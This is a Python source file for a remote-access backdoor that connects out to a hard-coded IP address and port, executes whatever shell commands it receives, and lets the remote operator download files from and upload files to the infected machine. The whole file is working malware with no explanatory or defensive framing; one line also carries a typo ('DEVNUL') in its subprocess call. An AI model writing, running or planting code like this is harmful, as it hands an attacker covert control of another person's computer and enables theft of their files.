import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True,stderr=subprocess.DEVNULL, stdin=subprocess.DEVNUL)
    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except OSError:
            return "[-] The path seems incorrect!"
    def read_file(self, path):
        try:
            with open(path, 'rb') as my_file:
                return base64.b64encode(my_file.read())
        except IOError:
            return "[-] The filename seems incorrect!"

    def write_file(self, path, content):
        with open(path, 'wb') as remote_file:
            remote_file.write(base64.b64decode(content))
            return "[+] Upload successful."
    def run(self):
       while True:
            command = self.reliable_receive()
            split_command = command.split(' ')
            try:
                if split_command[0] == "exit":
                    self.connection.close()
                    exit()
                elif split_command[0] == "cd" and len(split_command) > 1:
                    command_result = self.change_working_directory_to(split_command[-1])
                elif split_command[0] == "download":
                    command_result = self.read_file(split_command[-1])
                elif split_command[0] == "upload":
                    command_result = self.write_file(split_command[1], split_command[-1])
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result =  '[-] Error during command execution.\n'+str(e)
            self.reliable_send(command_result)

my_backdoor = Backdoor("192.168.123.183", 88)
my_backdoor.run()
